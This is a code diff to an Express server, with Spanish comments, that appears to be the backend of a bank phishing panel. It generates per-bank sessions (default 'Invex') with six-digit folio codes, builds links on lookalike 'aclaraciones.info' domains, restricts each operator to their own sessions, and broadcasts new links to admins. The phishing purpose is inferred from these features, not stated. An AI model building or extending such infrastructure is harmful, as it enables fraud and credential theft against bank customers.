@@ -446,7 +446,12 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
   app.get('/api/sessions', async (req, res) => {
     try {
+      if (!req.isAuthenticated()) {
+        return res.status(401).json({ message: "No autenticado" });
+      }
+
       const { type = 'current' } = req.query;
+      const currentUser = req.user;
 
       let sessions;
       if (type === 'saved') {
@@ -455,6 +460,12 @@ export async function registerRoutes(app: Express): Promise<Server> {
         sessions = await storage.getAllSessions();
       } else {
         sessions = await storage.getCurrentSessions();
+      }
+
+      // Filtrar para que cada usuario solo vea sus propias sesiones
+      // Los administradores pueden ver todas las sesiones
+      if (currentUser.role !== 'admin') {
+        sessions = sessions.filter(session => session.createdBy === currentUser.username);
       }
 
       res.json(sessions);
@@ -466,13 +477,29 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
   app.post('/api/sessions', async (req, res) => {
     try {
+      if (!req.isAuthenticated()) {
+        return res.status(401).json({ message: "No autenticado" });
+      }
+      
+      const user = req.user;
       const { banco = "Invex" } = req.body;
       const sessionId = nanoid(10);
+      
+      // Generamos un código de 6 dígitos numéricos para el folio
+      const generateSixDigitCode = () => {
+        let code = '';
+        for (let i = 0; i < 6; i++) {
+          code += Math.floor(Math.random() * 10).toString();
+        }
+        return code;
+      };
+      
       const session = await storage.createSession({ 
         sessionId, 
         banco,
-        folio: nanoid(6),
+        folio: generateSixDigitCode(),
         pasoActual: ScreenType.FOLIO,
+        createdBy: user.username,
       });
       res.json(session);
     } catch (error) {
@@ -589,17 +616,18 @@ export async function registerRoutes(app: Express): Promise<Server> {
         banco: banco as string,
         folio: sixDigitCode,
         pasoActual: ScreenType.FOLIO,
+        createdBy: user.username,
       });
 
-      // Utilizamos el dominio aclaracion.info en lugar de los dominios de Replit
-      const domain = 'aclaracion.info';
+      // Utilizamos el dominio aclaraciones.info (plural) en lugar de aclaracion.info
+      const domain = 'aclaraciones.info';
 
-      // Armamos el enlace final usando el dominio especificado
-      const link = `https://${domain}/client/${sessionId}`;
+      // Armamos el enlace final usando solo el código numérico sin "client"
+      const link = `https://${domain}/${sixDigitCode}`;
 
       console.log(`Nuevo enlace generado - Código: ${sixDigitCode}, Banco: ${banco}`);
       console.log(`URL del cliente: ${link}`);
-      console.log(`Generado por usuario: ${user.username}, Permisos de bancos: ${user.allowedBanks || 'all'}`);
+      console.log(`Generado por usuario: ${user.username}`);
 
       // Notificar a los clientes de admin sobre el nuevo enlace
       broadcastToAdmins(JSON.stringify({
